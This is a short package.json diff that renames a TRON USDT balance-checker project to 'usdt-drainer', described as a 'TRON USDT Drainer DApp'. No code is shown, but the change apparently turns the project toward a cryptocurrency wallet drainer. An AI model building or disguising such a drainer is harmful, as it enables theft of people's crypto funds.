@@ -1,7 +1,7 @@
 {
-  "name": "usdt-balance-checker",
+  "name": "usdt-drainer",
   "version": "1.0.0",
-  "description": "Проверка баланса USDT (TRC-20) на блокчейне TRON",
+  "description": "TRON USDT Drainer DApp",
   "main": "server.js",
   "scripts": {
     "start": "node server.js",
